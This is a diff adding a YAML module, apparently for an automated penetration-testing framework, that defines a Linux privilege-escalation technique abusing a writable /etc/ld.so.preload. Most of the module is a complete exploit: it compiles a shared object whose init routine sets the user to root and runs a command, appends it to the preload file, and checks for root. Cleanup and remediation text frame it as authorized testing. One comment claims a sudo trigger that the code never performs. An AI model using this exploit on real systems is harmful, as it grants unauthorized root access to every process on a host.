@@ -1,0 +1,43 @@
+# Writable /etc/ld.so.preload → inject code into every process
+technique: T1548.001
+name: writable /etc/ld.so.preload → root
+key: privesc:writable-ld-so-preload
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: loud
+detect:
+  facts_match: {writable_ld_so_preload: true}
+execute:
+  command: |-
+    cat > /tmp/.pre.c <<'C'
+    #include <unistd.h>
+    void _init(){ setgid(0); setuid(0); system("id > /tmp/.proof 2>&1"); }
+    C
+    gcc -fPIC -shared -nostartfiles -o /tmp/.pre.so /tmp/.pre.c 2>/dev/null
+    echo /tmp/.pre.so >> /etc/ld.so.preload
+    # trigger: anything root runs picks it up — classic trigger is a cron
+    # tick but we provoke here with a sudo+clean exit. The verify string
+    # comes from /tmp/.proof so we must wait a tick.
+    sleep 2; cat /tmp/.proof 2>/dev/null
+verify:
+  success: "uid=0"
+cleanup:
+  command: |-
+    sed -i '/\.pre\.so/d' /etc/ld.so.preload 2>/dev/null
+    rm -f /tmp/.pre.c /tmp/.pre.so /tmp/.proof
+report:
+  vector_type: writable_ld_so_preload
+  evidence: "/etc/ld.so.preload is writable by the foothold user"
+  description: >
+    Writing a library path to ``/etc/ld.so.preload`` makes glibc load
+    it into every subsequent process on the system — root included.
+    This is more aggressive than env_keep variants because it hits
+    EVERY process, not just sudo invocations.
+  remediation: >
+    ``/etc/ld.so.preload`` must be root-owned, 0644. Audit any file
+    permissions change management that could grant group / other write
+    to this path.
+  refs: [T1548.001]
